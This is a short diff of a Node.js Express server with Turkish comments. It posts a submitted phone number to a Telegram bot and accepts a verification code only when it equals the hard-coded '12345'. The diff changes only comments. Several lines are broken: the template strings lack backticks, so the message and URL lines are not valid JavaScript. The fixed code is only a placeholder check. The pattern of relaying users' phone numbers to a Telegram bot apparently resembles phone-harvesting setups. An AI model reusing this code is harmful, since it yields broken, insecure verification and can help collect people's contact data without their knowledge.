@@ -19,7 +19,7 @@ app.post('/send-phone', (req, res) => {
         return res.status(400).send('Telefon numarası eksik');
     }
 
-    const message = Yeni telefon numarası: ${phone}; // Düzeltilmiş satır
+    const message = Yeni telefon numarası: ${phone}; // Düzeltildi
 
     const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
     const payload = JSON.stringify({
@@ -64,7 +64,6 @@ app.post('/send-phone', (req, res) => {
 // Kod doğrulama isteği
 app.post('/verify-code', (req, res) => {
     const { code } = req.body;
-    // Doğrulama işlemini buraya ekleyin (örneğin, kodu kontrol etme)
     if (code === '12345') { // Örnek kod kontrolü
         res.status(200).json({ status: 'success' });
     } else {
